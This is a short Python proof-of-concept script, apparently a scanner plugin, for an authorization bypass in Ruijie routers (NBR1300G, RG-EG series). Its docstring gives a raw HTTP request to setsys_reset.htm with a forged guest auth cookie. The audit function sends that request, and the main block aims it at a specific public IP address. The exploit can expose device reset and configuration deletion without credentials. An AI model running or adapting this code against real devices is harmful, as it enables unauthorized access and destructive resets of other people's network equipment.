#!/usr/bin/env python
# -*- coding: utf-8 -*-
import urllib.parse
import time
import re

"""
RG-EG系列包括1000 2000 3000别的系列的没测试
POC Name  : 锐捷网络系列设备 通用 授权绕过2 初始化设备 未授权访问及删除配置文件 
Author    :  a
mail      :  a@lcx.cc
Referer   :  http://www.wooyun.org/bugs/wooyun-2010-082472

poc:
GET /setsys_reset.htm HTTP/1.1
Accept: image/gif, image/jpeg, image/pjpeg, application/x-ms-application, application/xaml+xml, application/x-ms-xbap, */*
Accept-Language: zh-Hans-CN,zh-Hans;q=0.5
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; WOW64; Trident/8.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; InfoPath.3; .NET CLR 1.1.4322)
Host: 222.179.151.196
Cookie: auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest; c_name=; p_name=; p_pass=; hardtype=NBR1300G; web-coding=gb2312; currentURL=index
"""

def assign(service, arg):
    if service == 'ruijie_router':
        arr = urllib.parse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    
    payload ='setsys_reset.htm'
    cookie ='auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest; c_name=; p_name=; p_pass=; hardtype=NBR1300G; web-coding=gb2312; currentURL=index'
    url = arg + payload
    code, head,res, errcode, _ = curl.curl2(url,cookie = cookie)
    if code ==  200 and 'remove-file config.text' in res :
        security_hole('NBR1300G can be reset and read config.txt')
    


if __name__ == '__main__':
    from dummy import *
    audit(assign('ruijie_router', 'http://222.179.151.196/')[1])